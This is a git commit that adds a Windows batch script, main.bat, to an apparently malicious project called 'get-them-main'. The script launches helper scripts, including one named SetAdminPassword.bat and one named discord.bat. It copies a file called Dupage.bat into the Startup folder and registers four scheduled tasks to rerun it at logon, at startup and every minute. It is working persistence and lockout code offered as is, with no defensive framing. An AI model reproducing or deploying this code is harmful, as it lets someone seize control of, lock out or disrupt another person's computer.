405337b9721b962edbda901d972f50e221bf33d6
ltzmrchicken <130897982+ILove-wheightlifting@users.noreply.github.com>
2025-03-26 12:20:07 -0400

    Add files via upload

---
+++ main.bat
@@ -0,0 +1,19 @@
+@echo off
+
+@REM start garbage\MAINVBS.vbs
+
+start %USERPROFILE%\Desktop\get-them-main\garbage\HasInternet.bat
+start %USERPROFILE%\Desktop\get-them-main\garbage\SetAdminPassword.bat
+start %USERPROFILE%\Desktop\get-them-main\garbage\discord.bat
+@REM start /min garbage\audio.bat
+
+copy "%USERPROFILE%\Desktop\get-them-main\garbage\Dupage.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+schtasks /create /tn "main" /tr "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Dupage.bat" /sc onlogon
+schtasks /create /tn "main2" /tr "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Dupage.bat" /sc onstart
+schtasks /create /tn "main3" /tr "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Dupage.bat" /sc onlogon
+schtasks /create /tn "main4" /tr "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Dupage.bat" /sc minute /mo 1
+
+start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Dupage.bat"
+
+exit
